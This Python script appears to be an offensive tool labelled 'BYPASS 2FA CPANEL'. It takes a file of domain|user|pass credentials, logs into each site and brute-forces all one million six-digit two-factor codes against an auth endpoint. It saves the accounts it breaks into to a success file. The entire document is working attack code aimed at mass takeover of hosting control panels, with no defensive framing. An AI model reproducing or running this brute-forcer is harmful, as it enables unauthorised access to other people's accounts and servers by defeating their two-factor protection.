import requests
import time

def urlinvincible(url):
    if url.startswith("http://"):
        url = url.replace("http://", "")
    elif url.startswith("https://"):
        url = url.replace("https://", "")
    return url

def bypass_2fa(line):
    spl = line.split('|')
    if len(spl) != 3:
        print("[x] Invalid format, skipping line.")
        return False

    url = urlinvincible(spl[0])
    username = spl[1]
    password = spl[2]

    base_url = f"https://{url}"
    login_url = f"{base_url}/login/"
    auth_url = f"{base_url}/auth/twofactor.html"

    session = requests.Session()
    
    login_data = {
        'user': username,
        'pass': password
    }

    try:
        response = session.post(login_url, data=login_data)
    except requests.RequestException as e:
        print(f"[x] Request failed: {e}")
        return False
    
    if "two-factor" not in response.text:
        print("[x] Login failed or two-factor authentication not enabled.")
        return False
    
    for code in range(1000000):
        twofa_data = {
            'user': username,
            'pass': password,
            'code': str(code).zfill(6)
        }
        try:
            response = session.post(auth_url, data=twofa_data)
        except requests.RequestException as e:
            print(f"[x] Request failed: {e}")
            return False

        if "Dashboard" in response.text:
            print(f"[+] 2FA Bypass successful with code {code}.")
            return True
        
        time.sleep(0.1)
    
    print("[x] 2FA Bypass failed.")
    return False

def cp_checker(filename):
    global TOTAL, WORK, FAILED, BAD
    TOTAL, WORK, FAILED, BAD = 0, 0, 0, 0
    
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print(f"[x] File not found: {filename}")
        return
    
    for line in lines:
        line = line.strip()
        if bypass_2fa(line):
            print(f"{line} [>] SUCCESS TO BYPASS")
            with open('!Success2FABypass.txt', 'a') as valid_file:
                valid_file.write(line + '\n')
            WORK += 1
        else:
            print(f"{line} [>] FAILED TO BYPASS")
            with open('!Failed2FABypass.txt', 'a') as invalid_file:
                invalid_file.write(line + '\n')
            FAILED += 1
        TOTAL += 1

if __name__ == '__main__':
    print("\t BYPASS 2FA CPANEL \n\t By Mr.InVinCibLe")
    print("\tFormat : domain|user|pass\n")
    filename = input("[?] Enter your Domain list : ")
    cp_checker(filename)
    print(f"\t\n Total: {TOTAL}\t\n SUCCESS: {WORK}\t\n FAILED: {FAILED}\t\n BAD: {BAD}")
